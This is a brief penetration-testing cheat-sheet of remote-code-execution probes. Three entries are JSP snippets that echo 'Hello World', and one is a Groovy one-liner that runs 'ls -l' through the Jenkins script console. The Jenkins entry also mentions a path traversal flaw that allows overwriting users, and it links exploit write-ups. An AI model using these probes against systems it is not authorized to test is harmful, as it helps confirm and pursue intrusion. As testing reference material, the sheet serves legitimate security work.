### 1. Echo hello world, test for RCE in JSP application.
```
<%="Hello Word"%>
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 2. Echo hello world, test for RCE in JSP application.
```
out.print("Hello World");
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 3. Echo hello world, test for RCE in JSP application.
```
<c:out value="${[variableName]}" />
```
**- web application,code execution,jsp**
#### References:

https://stackoverflow.com/questions/5713013/echo-instruction-in-jsp
__________
### 4. Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.
```
def process = "ls -l".execute();println "Found text ${process.text}"
```
**- linux,web application,Windows,code execution,Groovy**
#### References:

https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/
https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/
https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
__________
